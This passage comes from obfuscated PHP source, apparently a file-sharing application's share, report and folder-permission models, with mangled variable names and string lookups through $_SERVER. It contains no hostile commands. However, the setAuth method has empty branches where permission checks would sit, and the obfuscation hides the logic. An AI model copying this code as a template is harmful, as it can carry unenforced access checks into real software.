$Û¥Ü»ìÅ = array($·ÀÌœª¦[2061] => $Æñ­õ¡ì[$·ÀÌœª¦[1230]], $·ÀÌœª¦[1695] => $èƒĞ·ùŠ); } if ($±Åà…ÓÉ = $this->where($Û¥Ü»ìÅ)->find()) { return $±Åà…ÓÉ[$·ÀÌœª¦[636]]; } if ($Ù¤û¥¡ == 0) { $¹¢‡ğÙ» = array($·ÀÌœª¦[32] => get_path_this($Æñ­õ¡ì[$·ÀÌœª¦[86]])); } else { $¹¢‡ğÙ» = Model($·ÀÌœª¦[872])->sourceInfo($Ù¤û¥¡); if (!$¹¢‡ğÙ») { return !1; } } if (!$Æñ­õ¡ì[$·ÀÌœª¦[1600]]) { $Æñ­õ¡ì[$·ÀÌœª¦[1600]] = $¹¢‡ğÙ»[$·ÀÌœª¦[32]]; } $³“ì‘ƒõ = array($·ÀÌœª¦[1695] => $èƒĞ·ùŠ, $·ÀÌœª¦[461] => $Ù¤û¥¡, $·ÀÌœª¦[1600] => $·ÀÌœª¦[12], $·ÀÌœª¦[533] => 0, $·ÀÌœª¦[634] => 0, $·ÀÌœª¦[1230] => $·ÀÌœª¦[12], $·ÀÌœª¦[353] => $·ÀÌœª¦[12], $·ÀÌœª¦[943] => $·ÀÌœª¦[12], $·ÀÌœª¦[2062] => 0, $·ÀÌœª¦[2063] => 0, $·ÀÌœª¦[808] => 0, $·ÀÌœª¦[2064] => $·ÀÌœª¦[12], $·ÀÌœª¦[2045] => $·ÀÌœª¦[12]); $‡áò—ƒî = explode($·ÀÌœª¦[50], $·ÀÌœª¦[2065]); foreach ($‡áò—ƒî as $ä ¬€Î¹) { if (!isset($Æñ­õ¡ì[$ä ¬€Î¹])) { continue; } $³“ì‘ƒõ[$ä ¬€Î¹] = $Æñ­õ¡ì[$ä ¬€Î¹]; } $×ÄÏ÷ñê = $this->add($³“ì‘ƒõ); $‰…ï™ôí = array($·ÀÌœª¦[2045] => short_id($×ÄÏ÷ñê)); $this->where(array($·ÀÌœª¦[2066] => $×ÄÏ÷ñê))->save($‰…ï™ôí); return $×ÄÏ÷ñê; } private function _shareAuthSet($·»‰û, $î˜‡Ì°„) { $ÚÁÔçöº =& $_SERVER[Î‹ÃÂŞ„]; if (!is_array($î˜‡Ì°„)) { return !1; } $Â”Æ”Şˆ = Model($ÚÁÔçöº[2010]); $Â”Æ”Şˆ->where(array($ÚÁÔçöº[636] => $·»‰û))->delete(); $ú¿ºÂã = array(); foreach ($î˜‡Ì°„ as $¾•¯Ìï) { $î›±şóÔ = SourceModel::TYPE_USER; if ($¾•¯Ìï[$ÚÁÔçöº[180]] == SourceModel::TYPE_GROUP) { $î›±şóÔ = SourceModel::TYPE_GROUP; } $İÌçÍóÄ = array($ÚÁÔçöº[636] => $·»‰û, $ÚÁÔçöº[180] => $î›±şóÔ, $ÚÁÔçöº[541] => intval($¾•¯Ìï[$ÚÁÔçöº[541]]), $ÚÁÔçöº[2006] => 0, $ÚÁÔçöº[2067] => -1); if ($¾•¯Ìï[$ÚÁÔçöº[2006]]) { $İÌçÍóÄ[$ÚÁÔçöº[2006]] = $¾•¯Ìï[$ÚÁÔçöº[2006]]; } else { if ($¾•¯Ìï[$ÚÁÔçöº[2067]]) { $İÌçÍóÄ[$ÚÁÔçöº[2067]] = $¾•¯Ìï[$ÚÁÔçöº[2067]]; } } $ú¿ºÂã[] = $İÌçÍóÄ; } return $Â”Æ”Şˆ->addAll($ú¿ºÂã, array(), !0); } public function numViewAdd($Å¤çÓ¦) { $ÏèŠôÁ =& $_SERVER[Î‹ÃÂŞ„]; $û•¬À¬ = array($ÏèŠôÁ[2066] => $Å¤çÓ¦); $this->where($û•¬À¬)->setAdd($ÏèŠôÁ[2062]); } public function numDownloadAdd($¼Ÿ¾œÓ¼) { $ÒÓìıß =& $_SERVER[Î‹ÃÂŞ„]; $½Õšúè = array($ÒÓìıß[2066] => $¼Ÿ¾œÓ¼); $this->where($½Õšúè)->setAdd($ÒÓìıß[2063]); } protected function shareEdit($°ûËìÏ’, $Æ×ä—Æ) { $ÒøüŞ =& $_SERVER[Î‹ÃÂŞ„]; $—«Àø“¡ = $this->getInfo($°ûËìÏ’); if (!$—«Àø“¡) { return !1; } $this->_checkLinkShare($Æ×ä—Æ, $—«Àø“¡); $›‡×¤£Á = array(); $í«œî†¼ = explode($ÒøüŞ[50], $ÒøüŞ[2068]); foreach ($í«œî†¼ as $¨ÏÔèúÌ) { if (!array_key_exists($¨ÏÔèúÌ, $Æ×ä—Æ)) { continue; } $›‡×¤£Á[$¨ÏÔèúÌ] = $Æ×ä—Æ[$¨ÏÔèúÌ]; } $this->shareEventAdd($—«Àø“¡[$ÒøüŞ[183]], $Æ×ä—Æ, $ÒøüŞ[1872]); $this->where(array($ÒøüŞ[2066] => $°ûËìÏ’))->save($›‡×¤£Á); if (isset($Æ×ä—Æ[$ÒøüŞ[2054]])) { $this->_shareAuthSet($°ûËìÏ’, $Æ×ä—Æ[$ÒøüŞ[2054]]); } return !0; } private function _checkLinkShare($·ö¦ùÓ×, $ô˜éõÄ°) { $ïè¬“‡ =& $_SERVER[Î‹ÃÂŞ„]; if ($·ö¦ùÓ×[$ïè¬“‡[533]] != $ïè¬“‡[90]) { return; } $©±¥ÉÂ¯ = $ô˜éõÄ°[$ïè¬“‡[89]][$ïè¬“‡[183]]; if ($ô˜éõÄ°[$ïè¬“‡[89]][$ïè¬“‡[33]] != $ïè¬“‡[216]) { $«Í¼ÑŞÇ = $this->_folderReport($©±¥ÉÂ¯); if (!$«Í¼ÑŞÇ) { return; } show_json(LNG($ïè¬“‡[2069]) . $ïè¬“‡[2070] . $«Í¼ÑŞÇ, !1); } $©Òëò—× = Model($ïè¬“‡[872])->fileInfoGet($ô˜éõÄ°[$ïè¬“‡[89]][$ïè¬“‡[183]]); if (!$©Òëò—×) { return; } $ÎÔ†•ƒ¶ = $this->shareFileMeta($©Òëò—×[$ïè¬“‡[511]]); if (isset($ÎÔ†•ƒ¶[$ïè¬“‡[420]]) && $ÎÔ†•ƒ¶[$ïè¬“‡[420]] == $ïè¬“‡[90]) { show_json(LNG($ïè¬“‡[2071]), !1); } } private function _folderReport($‹²‰•Éî) { $ï¬¡°ıØ =& $_SERVER[Î‹ÃÂŞ„]; $¥ƒ½›—¹ = array($ï¬¡°ıØ[511] => array($ï¬¡°ıØ[1067], 0), $ï¬¡°ıØ[797] => 3); $¦ø‡ú°Ë = Model($ï¬¡°ıØ[2072])->where($¥ƒ½›—¹)->field($ï¬¡°ıØ[511])->select(); if (!$¦ø‡ú°Ë) { return !1; } $¦ø‡ú°Ë = array_to_keyvalue($¦ø‡ú°Ë, $ï¬¡°ıØ[12], $ï¬¡°ıØ[511]); $ƒ¼Ÿ«© = $ï¬¡°ıØ[50] . $‹²‰•Éî . $ï¬¡°ıØ[50]; $¥ƒ½›—¹ = array($ï¬¡°ıØ[511] => array($ï¬¡°ıØ[7], $¦ø‡ú°Ë), $ï¬¡°ıØ[556] => array($ï¬¡°ıØ[429], "\45{$ƒ¼Ÿ«©}\x25"), $ï¬¡°ıØ[475] => 0); $Ö¤¸ŠÕÃ = Model($ï¬¡°ıØ[872])->where($¥ƒ½›—¹)->field($ï¬¡°ıØ[2073])->find(); if (!$Ö¤¸ŠÕÃ) { return !1; } $ÚåÑ»‰œ = substr($Ö¤¸ŠÕÃ[$ï¬¡°ıØ[556]], strpos($Ö¤¸ŠÕÃ[$ï¬¡°ıØ[556]], $ƒ¼Ÿ«©)); $¥ƒ½›—¹ = array($ï¬¡°ıØ[183] => array($ï¬¡°ıØ[7], trim($ÚåÑ»‰œ, $ï¬¡°ıØ[50]))); $‹ÈÓû§† = Model($ï¬¡°ıØ[872])->where($¥ƒ½›—¹)->field($ï¬¡°ıØ[32])->select(); $·ìÀ±“Ì = array_to_keyvalue($‹ÈÓû§†, $ï¬¡°ıØ[12], $ï¬¡°ıØ[32]); $·ìÀ±“Ì[] = $Ö¤¸ŠÕÃ[$ï¬¡°ıØ[32]]; return implode($ï¬¡°ıØ[8], $·ìÀ±“Ì); } protected function remove($Ë†“ô¿º) { $°ıšèÆ‹ =& $_SERVER[Î‹ÃÂŞ„]; if (is_array($Ë†“ô¿º)) { $Ë†“ô¿º = array($°ıšèÆ‹[7], $Ë†“ô¿º); } $€›´ˆö¦ = array($°ıšèÆ‹[636] => $Ë†“ô¿º); $×ßû¹á½ = $this->where($€›´ˆö¦)->delete(); if ($×ßû¹á½) { Model($°ıšèÆ‹[637])->where(array($°ıšèÆ‹[636] => $Ë†“ô¿º))->delete(); } $—»“Î¢œ = is_array($Ë†“ô¿º) ? $Ë†“ô¿º[1] : array($Ë†“ô¿º); for ($¼¤‹ë— = 0; $¼¤‹ë— < count($—»“Î¢œ); $¼¤‹ë—++) { $æ°ÃÒÊÙ = $this->getInfo($—»“Î¢œ[$¼¤‹ë—]); if ($æ°ÃÒÊÙ[$°ıšèÆ‹[634]] == $°ıšèÆ‹[90]) { Model($°ıšèÆ‹[604])->eventShare($æ°ÃÒÊÙ[$°ıšèÆ‹[183]], $°ıšèÆ‹[2060]); } if ($æ°ÃÒÊÙ[$°ıšèÆ‹[533]] == $°ıšèÆ‹[90]) { Model($°ıšèÆ‹[604])->eventShare($æ°ÃÒÊÙ[$°ıšèÆ‹[183]], $°ıšèÆ‹[2059]); } } return $×ßû¹á½; } protected function removeBySource($Ïª¿ªÚ³) { $§ÌÓİˆ =& $_SERVER[Î‹ÃÂŞ„]; $ã°Ó‡Ñ = array($§ÌÓİˆ[461] => array($§ÌÓİˆ[462], $Ïª¿ªÚ³)); $µôÎ–Ê“ = $this->field($§ÌÓİˆ[636])->where($ã°Ó‡Ñ)->select(); $µôÎ–Ê“ = array_to_keyvalue($µôÎ–Ê“, $§ÌÓİˆ[12], $§ÌÓİˆ[636]); if (!$µôÎ–Ê“) { return; } $ã°Ó‡Ñ = array($§ÌÓİˆ[2066] => array($§ÌÓİˆ[462], $µôÎ–Ê“)); $this->where($ã°Ó‡Ñ)->delete(); Model($§ÌÓİˆ[637])->where($ã°Ó‡Ñ)->delete(); } public function listAll($É«™¶Õ) { $ÎóÇÓùŒ =& $_SERVER[Î‹ÃÂŞ„]; $üˆÒö¥ = array(); if ($É«™¶Õ[$ÎóÇÓùŒ[1704]]) { $üˆÒö¥[$ÎóÇÓùŒ[1704]] = $É«™¶Õ[$ÎóÇÓùŒ[1704]]; } if ($É«™¶Õ[$ÎóÇÓùŒ[807]]) { $€œÛÁø» = $É«™¶Õ[$ÎóÇÓùŒ[808]] ? $É«™¶Õ[$ÎóÇÓùŒ[808]] : strtotime(date($ÎóÇÓùŒ[2074])); $üˆÒö¥[$ÎóÇÓùŒ[217]] = array($ÎóÇÓùŒ[379], array($É«™¶Õ[$ÎóÇÓùŒ[807]], $€œÛÁø»)); } if ($É«™¶Õ[$ÎóÇÓùŒ[33]]) { $üˆÒö¥[$É«™¶Õ[$ÎóÇÓùŒ[33]]] = 1; } else { $üˆÒö¥[] = array($ÎóÇÓùŒ[533] => array($ÎóÇÓùŒ[1067], 0), $ÎóÇÓùŒ[634] => array($ÎóÇÓùŒ[1067], 0), $ÎóÇÓùŒ[2048] => $ÎóÇÓùŒ[2000]); } if ($É«™¶Õ[$ÎóÇÓùŒ[1996]]) { $üˆÒö¥[] = array($ÎóÇÓùŒ[2045] => $É«™¶Õ[$ÎóÇÓùŒ[1996]], $ÎóÇÓùŒ[1600] => array($ÎóÇÓùŒ[429], "\45{$É«™¶Õ[$ÎóÇÓùŒ[1996]]}\x25"), $ÎóÇÓùŒ[2048] => $ÎóÇÓùŒ[2000]); } $·óá†£€ = $this->_makeOrder()->where($üˆÒö¥)->selectPage(20); if (empty($·óá†£€[$ÎóÇÓùŒ[415]])) { return array(); } $this->_listDataApply($·óá†£€[$ÎóÇÓùŒ[415]]); return $·óá†£€; } public function listDataApply($“Æ¿†…Ú) { $this->_listDataApply($“Æ¿†…Ú); return $“Æ¿†…Ú; } private function _listDataApply(&$×Ğˆ±´©) { $ÂìËÒŒ× =& $_SERVER[Î‹ÃÂŞ„]; $ª‡·¤×Ï = array_to_keyvalue($×Ğˆ±´©, $ÂìËÒŒ×[12], $ÂìËÒŒ×[1704]); $î»‘£ß™ = Model($ÂìËÒŒ×[570])->userListInfo(array_unique($ª‡·¤×Ï)); $‰ˆ•Íá¹ = array_to_keyvalue($×Ğˆ±´©, $ÂìËÒŒ×[12], $ÂìËÒŒ×[183]); $Í»«Ê‚ = Model($ÂìËÒŒ×[872])->sourceListInfo($‰ˆ•Íá¹, !0); foreach ($×Ğˆ±´© as $ÎøÈäè => &$å°—ïµ‹) { $™Îä¼Èî = $å°—ïµ‹[$ÂìËÒŒ×[1704]]; $å°—ïµ‹[$ÂìËÒŒ×[2075]] = $î»‘£ß™[$™Îä¼Èî] ? $î»‘£ß™[$™Îä¼Èî] : !1; $˜ñĞİªî = $å°—ïµ‹[$ÂìËÒŒ×[183]]; $å°—ïµ‹[$ÂìËÒŒ×[89]] = $Í»«Ê‚[$˜ñĞİªî] ? $Í»«Ê‚[$˜ñĞİªî] : !1; if ($å°—ïµ‹[$ÂìËÒŒ×[89]][$ÂìËÒŒ×[475]] == $ÂìËÒŒ×[90]) { unset($×Ğˆ±´©[$ÎøÈäè]); } if ($å°—ïµ‹[$ÂìËÒŒ×[89]] != $ÂìËÒŒ×[214] && !$å°—ïµ‹[$ÂìËÒŒ×[89]]) { unset($×Ğˆ±´©[$ÎøÈäè]); } } unset($å°—ïµ‹); $×Ğˆ±´© = array_values($×Ğˆ±´©); } private function _makeOrder($°ÎØå¯® = '') { $İ¥Í¨æÛ =& $_SERVER[Î‹ÃÂŞ„]; $¯ÅÉüÑ¬ = array($İ¥Í¨æÛ[217], $İ¥Í¨æÛ[808], $İ¥Í¨æÛ[2062], $İ¥Í¨æÛ[2063]); $Ïî§ùÈó = array($İ¥Í¨æÛ[493] => $İ¥Í¨æÛ[494], $İ¥Í¨æÛ[495] => $İ¥Í¨æÛ[496]); $—û²ÁÛ = Input::get($İ¥Í¨æÛ[500], $İ¥Í¨æÛ[7], $İ¥Í¨æÛ[467], $¯ÅÉüÑ¬); $ÙÊ‹ß“É = Input::get($İ¥Í¨æÛ[501], $İ¥Í¨æÛ[7], $İ¥Í¨æÛ[2076], array($İ¥Í¨æÛ[1993], $İ¥Í¨æÛ[495])); $ÙÊ‹ß“É = $Ïî§ùÈó[$ÙÊ‹ß“É]; $°ÎØå¯® = $°ÎØå¯® . "{$—û²ÁÛ}\x20{$ÙÊ‹ß“É}"; return $this->order($°ÎØå¯®); } public function reportAdd($ëşÀĞëÈ) { $«ó„Ü¿ =& $_SERVER[Î‹ÃÂŞ„]; $õ¢¨âÛŞ = array($«ó„Ü¿[636] => $ëşÀĞëÈ[$«ó„Ü¿[636]], $«ó„Ü¿[1704] => USER_ID); if (Model($«ó„Ü¿[2072])->where($õ¢¨âÛŞ)->find()) { return !1; } $·³©©ù = array($«ó„Ü¿[636] => $ëşÀĞëÈ[$«ó„Ü¿[636]], $«ó„Ü¿[1600] => $ëşÀĞëÈ[$«ó„Ü¿[1600]], $«ó„Ü¿[183] => $ëşÀĞëÈ[$«ó„Ü¿[183]], $«ó„Ü¿[511] => $ëşÀĞëÈ[$«ó„Ü¿[511]], $«ó„Ü¿[1704] => USER_ID, $«ó„Ü¿[33] => $ëşÀĞëÈ[$«ó„Ü¿[33]], $«ó„Ü¿[496] => $ëşÀĞëÈ[$«ó„Ü¿[496]]); return Model($«ó„Ü¿[2072])->add($·³©©ù); } public function reportList($›¶ËÎª¿) { $‘Ï˜Óƒ‘ =& $_SERVER[Î‹ÃÂŞ„]; $ıİ¤ÖÔù = array(); if ($›¶ËÎª¿[$‘Ï˜Óƒ‘[807]]) { $î§ôÖ¹¤ = $›¶ËÎª¿[$‘Ï˜Óƒ‘[808]] ? $›¶ËÎª¿[$‘Ï˜Óƒ‘[808]] : strtotime(date($‘Ï˜Óƒ‘[2074])); $ıİ¤ÖÔù[$‘Ï˜Óƒ‘[217]] = array($‘Ï˜Óƒ‘[379], array($›¶ËÎª¿[$‘Ï˜Óƒ‘[807]], $î§ôÖ¹¤)); } if (isset($›¶ËÎª¿[$‘Ï˜Óƒ‘[33]]) && in_array($›¶ËÎª¿[$‘Ï˜Óƒ‘[33]], array($‘Ï˜Óƒ‘[90], $‘Ï˜Óƒ‘[480], $‘Ï˜Óƒ‘[2077], $‘Ï˜Óƒ‘[2078], $‘Ï˜Óƒ‘[2079]))) { $ıİ¤ÖÔù[$‘Ï˜Óƒ‘[33]] = $›¶ËÎª¿[$‘Ï˜Óƒ‘[33]]; } if (isset($›¶ËÎª¿[$‘Ï˜Óƒ‘[797]]) && in_array($›¶ËÎª¿[$‘Ï˜Óƒ‘[797]], array($‘Ï˜Óƒ‘[214], $‘Ï˜Óƒ‘[90], $‘Ï˜Óƒ‘[480], $‘Ï˜Óƒ‘[2077]))) { $ıİ¤ÖÔù[$‘Ï˜Óƒ‘[797]] = $›¶ËÎª¿[$‘Ï˜Óƒ‘[797]]; } $öÎŸê‡ = Input::get($‘Ï˜Óƒ‘[501], $‘Ï˜Óƒ‘[7], $‘Ï˜Óƒ‘[2076], array($‘Ï˜Óƒ‘[1993], $‘Ï˜Óƒ‘[495])); $ä½‰œûû = array($‘Ï˜Óƒ‘[493] => $‘Ï˜Óƒ‘[494], $‘Ï˜Óƒ‘[495] => $‘Ï˜Óƒ‘[496]); $…¤ëŒ“Š = $‘Ï˜Óƒ‘[2080] . $ä½‰œûû[$öÎŸê‡]; $Á€¢œ†Ë = Model($‘Ï˜Óƒ‘[2072])->where($ıİ¤ÖÔù)->order($…¤ëŒ“Š)->selectPage(20); if (empty($Á€¢œ†Ë[$‘Ï˜Óƒ‘[415]])) { return array(); } $øıù÷È” = array_to_keyvalue_group($Á€¢œ†Ë[$‘Ï˜Óƒ‘[415]], $‘Ï˜Óƒ‘[797], $‘Ï˜Óƒ‘[636]); if (!empty($øıù÷È”[0])) { $›¶ËÎª¿ = $øıù÷È”[0]; $ıİ¤ÖÔù = array($‘Ï˜Óƒ‘[636] => array($‘Ï˜Óƒ‘[7], $›¶ËÎª¿)); $›¥í–Á§ = $this->where($ıİ¤ÖÔù)->field($‘Ï˜Óƒ‘[636])->select(); $›¥í–Á§ = array_to_keyvalue($›¥í–Á§, $‘Ï˜Óƒ‘[12], $‘Ï˜Óƒ‘[636]); $ĞŞÖì = array_diff($›¶ËÎª¿, $›¥í–Á§); if (!empty($ĞŞÖì)) { foreach ($Á€¢œ†Ë[$‘Ï˜Óƒ‘[415]] as $èŞˆŸ°² => $ş¨úí¹Ã) { if (in_array($ş¨úí¹Ã[$‘Ï˜Óƒ‘[636]], $ĞŞÖì)) { unset($Á€¢œ†Ë[$‘Ï˜Óƒ‘[415]][$èŞˆŸ°²]); } } } } $this->_listDataApply($Á€¢œ†Ë[$‘Ï˜Óƒ‘[415]]); return $Á€¢œ†Ë; } public function reportStatus($¤ßôÛô¸) { $…ßşÚ¨ =& $_SERVER[Î‹ÃÂŞ„]; $Ùí†ñˆì = array($…ßşÚ¨[445] => $¤ßôÛô¸[$…ßşÚ¨[445]]); $ÀúµÜÇõ = Model($…ßşÚ¨[2072])->where($Ùí†ñˆì)->field($…ßşÚ¨[2081])->find(); if (!$ÀúµÜÇõ) { return !1; } $×æÉºÕÏ = array($…ßşÚ¨[797] => $¤ßôÛô¸[$…ßşÚ¨[797]]); if ($¤ßôÛô¸[$…ßşÚ¨[797]] == $…ßşÚ¨[2077] && $ÀúµÜÇõ[$…ßşÚ¨[797]] == $…ßşÚ¨[2077]) { $×æÉºÕÏ[$…ßşÚ¨[797]] = 0; } $ŒÊåü†® = Model($…ßşÚ¨[2072])->where($Ùí†ñˆì)->save($×æÉºÕÏ); if ($¤ßôÛô¸[$…ßşÚ¨[797]] == $…ßşÚ¨[480]) { if ($ÀúµÜÇõ[$…ßşÚ¨[511]] != $…ßşÚ¨[214] && $this->shareFileMeta($ÀúµÜÇõ[$…ßşÚ¨[511]])) { $this->shareFileMeta($ÀúµÜÇõ[$…ßşÚ¨[511]], 0); } $this->remove($ÀúµÜÇõ[$…ßşÚ¨[636]]); return !0; } if ($ŒÊåü†® && $¤ßôÛô¸[$…ßşÚ¨[797]] == $…ßşÚ¨[2077]) { $êªÅÓ‰° = $×æÉºÕÏ[$…ßşÚ¨[797]] == $…ßşÚ¨[2077] ? 1 : 0; $this->shareFileMeta($ÀúµÜÇõ[$…ßşÚ¨[511]], $êªÅÓ‰°); $this->removeByFile($ÀúµÜÇõ[$…ßşÚ¨[511]]); } return $ŒÊåü†®; } private function removeByFile($—ğÛÑí–) { $ğèş¶“  =& $_SERVER[Î‹ÃÂŞ„]; $äª“…À¿ = Model($ğèş¶“ [872])->where(array($ğèş¶“ [511] => $—ğÛÑí–))->field($ğèş¶“ [183])->select(); $è¬—Êêº = array_to_keyvalue($äª“…À¿, $ğèş¶“ [12], $ğèş¶“ [183]); $ææÌêøõ = array($ğèş¶“ [183] => array($ğèş¶“ [7], $è¬—Êêº), $ğèş¶“ [533] => 1); $äª“…À¿ = $this->where($ææÌêøõ)->field($ğèş¶“ [636])->select(); if (empty($äª“…À¿)) { return; } $‚¹‡€„Ô = array_to_keyvalue($äª“…À¿, $ğèş¶“ [12], $ğèş¶“ [636]); $this->remove($‚¹‡€„Ô); } private function shareFileMeta($Ìñ½Á¡, $Ë¾óÆË = null) { $®ïİ‡öÜ =& $_SERVER[Î‹ÃÂŞ„]; $ÃÑÛµ¹¬ = array($®ïİ‡öÜ[511] => $Ìñ½Á¡, $®ïİ‡öÜ[96] => $®ïİ‡öÜ[2082]); if (is_null($Ë¾óÆË)) { return Model($®ïİ‡öÜ[2083])->where($ÃÑÛµ¹¬)->find(); } $ÃÑÛµ¹¬[$®ïİ‡öÜ[420]] = $Ë¾óÆË; Model($®ïİ‡öÜ[2083])->add($ÃÑÛµ¹¬, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\162\143\145\137\x61\x75\x74\x68"; public function getAuth($¼°à°Îö) { $÷”Œ½è =& $_SERVER[Î‹ÃÂŞ„]; $è²ñê¦ = $this->sourceAuthSelect($¼°à°Îö); $ºüãÕûš = array(); $‰ò¢’ = array(); $ÔšÀÂìÎ = 2 << 25; foreach ($è²ñê¦ as $üÕßº£ß) { $ô›¾×² = Model($÷”Œ½è[543])->listData($üÕßº£ß[$÷”Œ½è[2006]]); if (!$ô›¾×²) { continue; } $ºüãÕûš[] = $üÕßº£ß; $‹À¤·Í‘ = 0; if ($üÕßº£ß[$÷”Œ½è[180]] == SourceModel::TYPE_GROUP) { $‹À¤·Í‘ = $ÔšÀÂìÎ * 2; } if ($üÕßº£ß[$÷”Œ½è[180]] == SourceModel::TYPE_USER) { $‹À¤·Í‘ = $ÔšÀÂìÎ; } if ($üÕßº£ß[$÷”Œ½è[180]] == SourceModel::TYPE_USER && $üÕßº£ß[$÷”Œ½è[541]] == $÷”Œ½è[214]) { $‹À¤·Í‘ = 0; } $‰ò¢’[] = $ô›¾×²[$÷”Œ½è[457]] + $‹À¤·Í‘; } array_multisort($‰ò¢’, SORT_DESC, $ºüãÕûš); return $ºüãÕûš; } public function sourceAuthSelect($ŒÇ—Ğˆù) { $ìÕÙã¿ö =& $_SERVER[Î‹ÃÂŞ„]; static $Ğ§†×Œï = array(); $‚ªôŒı‚ = is_array($ŒÇ—Ğˆù) ? !1 : !0; if ($‚ªôŒı‚) { $ŒÇ—Ğˆù = array($ŒÇ—Ğˆù); } $–¨Áõºò = array(); foreach ($ŒÇ—Ğˆù as $´€òÔ÷«) { if (isset($Ğ§†×Œï[$´€òÔ÷«])) { $–¨Áõºò[$´€òÔ÷«] = $Ğ§†×Œï[$´€òÔ÷«]; } } if (count($–¨Áõºò) == count($ŒÇ—Ğˆù)) { return $‚ªôŒı‚ ? $–¨Áõºò[$ŒÇ—Ğˆù[0]] : $–¨Áõºò; } $ŠÜç™´û = $ìÕÙã¿ö[2084]; $È¤ÀÑô = array($ìÕÙã¿ö[183] => array($ìÕÙã¿ö[7], $ŒÇ—Ğˆù)); $ô ŠÁ ò = $this->field($ŠÜç™´û)->order($ìÕÙã¿ö[445])->where($È¤ÀÑô)->select(); $ÚÉë£×Ø = array_to_keyvalue_group($ô ŠÁ ò, $ìÕÙã¿ö[183]); foreach ($ŒÇ—Ğˆù as $´€òÔ÷«) { $Ğ§†×Œï[$´€òÔ÷«] = $ÚÉë£×Ø[$´€òÔ÷«] ? $ÚÉë£×Ø[$´€òÔ÷«] : array(); } if ($‚ªôŒı‚) { return $ô ŠÁ ò; } return $ÚÉë£×Ø; } public function setAuth($¿‘½ŒŠğ, $Ç¯Ø¾©ê) { $²ôäÓô =& $_SERVER[Î‹ÃÂŞ„]; $äÄ´êô· = Model($²ôäÓô[1388])->sourceInfo($¿‘½ŒŠğ); if (!$äÄ´êô·) { return !1; } if ($äÄ´êô·[$²ôäÓô[180]] != SourceModel::TYPE_GROUP) { return !1; } $Ë—‹Ÿ¢Û = 1; $ğ´ŠÆ†« = $äÄ´êô·[$²ôäÓô[541]]; if ($ğ´ŠÆ†« != $Ë—‹Ÿ¢Û) { $Üê Ò­… = array($²ôäÓô[1902] => $ğ´ŠÆ†«); $™Ó–­Ïû = Model($²ôäÓô[1992])->field($²ôäÓô[1704])->where($Üê Ò­…)->select(); $™Ó–­Ïû = array_to_keyvalue($™Ó–­Ïû, $²ôäÓô[12], $²ôäÓô[1704]); } $ı€áãŸÂ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $”â®ã£Ş = array(); foreach ($Ç¯Ø¾©ê as $Ú“İæÑ™) { if (!in_array($Ú“İæÑ™[$²ôäÓô[180]], $ı€áãŸÂ)) { show_json(LNG($²ôäÓô[2085]), !1); } if ($ğ´ŠÆ†« != $Ë—‹Ÿ¢Û) { if ($Ú“İæÑ™[$²ôäÓô[180]] == SourceModel::TYPE_GROUP) { } if ($Ú“İæÑ™[$²ôäÓô[541]] != 0 && !in_array($Ú“İæÑ™[$²ôäÓô[541]], $™Ó–­Ïû)) { } } if ($Ú“İæÑ™[$²ôäÓô[541]] == 0) { $Ú“İæÑ™[$²ôäÓô[180]] = SourceModel::TYPE_USER; } $”â®ã£Ş[] = array($²ôäÓô[183] => $¿‘½ŒŠğ, $²ôäÓô[180] => intval($Ú“İæÑ™[$²ôäÓô[180]]), $²ôäÓô[541] => intval($Ú“İæÑ™[$²ôäÓô[541]]), $²ôäÓô[2006] => intval($Ú“İæÑ™[$²ôäÓô[2006]]) ? intval($Ú“İæÑ™[$²ôäÓô[2006]]) : 0, $²ôäÓô[2067] => intval($Ú“İæÑ™[$²ôäÓô[2067]]) ? intval($Ú“İæÑ™[$²ôäÓô[2067]]) : -1); } $this->where(array($²ôäÓô[461] => $¿‘½ŒŠğ))->delete(); $this->addAll($”â®ã£Ş); return !0; } public function authClear($¶êìõÌ“) { $æ·Ö¦‰Ğ =& $_SERVER[Î‹ÃÂŞ„]; $«°•‘†ô = Model($æ·Ö¦‰Ğ[1388])->sourceInfo($¶êìõÌ“); $´’ˆø¡æ = array($¶êìõÌ“); if ($«°•‘†ô[$æ·Ö¦‰Ğ[455]] == $æ·Ö¦‰Ğ[90]) { $„ºıª÷î = array($æ·Ö¦‰Ğ[623] => array($æ·Ö¦‰Ğ[583], $«°•‘†ô[$æ·Ö¦‰Ğ[556]] . $¶êìõÌ“ . $æ·Ö¦‰Ğ[584])); $´’ˆø¡æ = Model($æ·Ö¦‰Ğ[1388])->field($æ·Ö¦‰Ğ[461])->where($„ºıª÷î)->getField($æ·Ö¦‰Ğ[183], !0); $´’ˆø¡æ[] = $¶êìõÌ“; } $this->where(array($æ·Ö¦‰Ğ[461] => array($æ·Ö¦‰Ğ[462], $´’ˆø¡æ)))->delete(); return !0; } public function getAllChildren($ÔüŸ¦ùö) { $´ÏˆµÖş =& $_SERVER[Î‹ÃÂŞ„]; $ãŞ¢‹’î = Model($´ÏˆµÖş[1388])->sourceInfo($ÔüŸ¦ùö); if ($ãŞ¢‹’î[$´ÏˆµÖş[455]] != $´ÏˆµÖş[90]) { return $this->sourceListAuth(array($ÔüŸ¦ùö)); } if ($ãŞ¢‹’î[$´ÏˆµÖş[180]] != SourceModel::TYPE_GROUP) { return array(); } $¾ÜùíÇ = 1; $Œİ¹“è = array($ÔüŸ¦ùö); if ($ãŞ¢‹’î[$´ÏˆµÖş[182]] == $´ÏˆµÖş[214] && $ãŞ¢‹’î[$´ÏˆµÖş[541]] != $¾ÜùíÇ) { $Œİ¹“è = $this->groupChidldAllRootSource($ãŞ¢‹’î[$´ÏˆµÖş[541]]); } $ÍáÂÇ’Ÿ = $this->field($´ÏˆµÖş[183])->group($´ÏˆµÖş[183])->select(); $ÍáÂÇ’Ÿ = array_to_keyvalue($ÍáÂÇ’Ÿ, $´ÏˆµÖş[12], $´ÏˆµÖş[183]); if (!$ÍáÂÇ’Ÿ) { return array(); } $©âÖÍ€™ = $´ÏˆµÖş[2086]; $Ë™¼€Õ = array($´ÏˆµÖş[183] => array($´ÏˆµÖş[7], $ÍáÂÇ’Ÿ), $´ÏˆµÖş[475] => $´ÏˆµÖş[214]); $­Ìõ§˜“ = Model($´ÏˆµÖş[872])->field($©âÖÍ€™)->where($Ë™¼€Õ)->select(); $¢†ùƒõƒ = array($ÔüŸ¦ùö); foreach ($­Ìõ§˜“ as $ü¢¬…¼ê) { foreach ($Œİ¹“è as $—›¬ã›†) { $Ö×È±ë  = $´ÏˆµÖş[50] . $—›¬ã›† . $´ÏˆµÖş[50]; $ô×§Êß³ = $ü¢¬…¼ê[$´ÏˆµÖş[556]] . 